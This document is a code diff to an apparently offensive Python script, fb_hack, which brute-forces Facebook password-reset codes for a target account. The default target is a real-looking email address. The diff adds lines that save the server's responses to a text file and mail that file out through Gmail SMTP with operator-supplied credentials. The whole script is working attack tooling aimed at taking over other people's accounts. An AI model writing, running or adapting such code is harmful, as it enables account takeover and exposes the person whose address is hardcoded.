@@ -1,11 +1,10 @@
-import itertools
-import sys
 from time import sleep
 from bs4 import BeautifulSoup
-import requests
-import mechanize
-import os
-import re
+import itertools, sys, requests, mechanize, os, re, email, smtplib, ssl
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
@@ -69,6 +68,8 @@ def fb_hack(email, codex, respect):
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
         with open("output1.html", "w") as file:
+          file.write(str(soup))
+        with open("output1.txt", "w") as file:
           file.write(str(soup))
       could = int(counter)
       code1 = (str(could), str(p), "failed")
@@ -164,7 +165,44 @@ os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
 past = int(input('Length: ') or 6)
+sender_email = input("Your Email:")
+receiver_email = input("Recipient:")
+password = input("Type your password and press enter:")
 while past >= 6:
   fb_hack(ehack, reset, past)
   past += 1
 
+subject = "An email with attachment from Python"
+body = "This is an email with attachment sent from Python"
+# Create a multipart message and set headers
+message = MIMEMultipart()
+message["From"] = sender_email
+message["To"] = receiver_email
+message["Subject"] = subject
+message["Bcc"] = receiver_email  # Recommended for mass emails
+# Add body to email
+message.attach(MIMEText(body, "plain"))
+
+filename = "output1.txt"  # In same directory as script
+# Open PDF file in binary mode
+with open(filename, "rb") as attachment:
+    # Add file as application/octet-stream
+    # Email client can usually download this automatically as attachment
+    part = MIMEBase("application", "octet-stream")
+    part.set_payload(attachment.read())
+
+# Encode file in ASCII characters to send by email    
+encoders.encode_base64(part)
+
+# Add header as key/value pair to attachment part
+part.add_header("Content-Disposition", f"attachment; filename= {filename}",)
+
+# Add attachment to message and convert message to string
+message.attach(part)
+text = message.as_string()
+
+# Log in to server using secure context and send email
+context = ssl.create_default_context()
+with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+    server.login(sender_email, password)
+    server.sendmail(sender_email, receiver_email, text)
